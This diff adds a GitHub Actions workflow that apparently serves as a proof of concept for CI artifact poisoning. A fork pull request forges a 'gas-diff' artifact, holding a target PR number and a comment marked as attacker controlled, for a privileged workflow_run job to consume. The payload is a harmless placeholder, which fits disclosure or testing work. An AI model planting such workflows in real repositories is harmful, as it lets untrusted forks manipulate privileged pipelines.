@@ -1,0 +1,28 @@
+name: ci
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft the artifact consumed by the privileged workflow_run job
+        run: |
+          mkdir -p gas-diff
+          printf '1' > gas-diff/pr-number.txt
+          {
+            echo '## Forged gas diff (attacker controlled)'
+            echo ''
+            echo 'This comment body and target PR number came from an artifact'
+            echo 'uploaded by a fork pull request.'
+            echo ''
+            echo '| Function | Before | After |'
+            echo '| --- | --- | --- |'
+            echo '| gas-diff-proof | 0 | 0 |'
+          } > gas-diff/comment.md
+      - name: Upload gas diff artifact
+        uses: actions/upload-artifact@v7.0.1
+        with:
+          name: gas-diff
+          path: gas-diff/
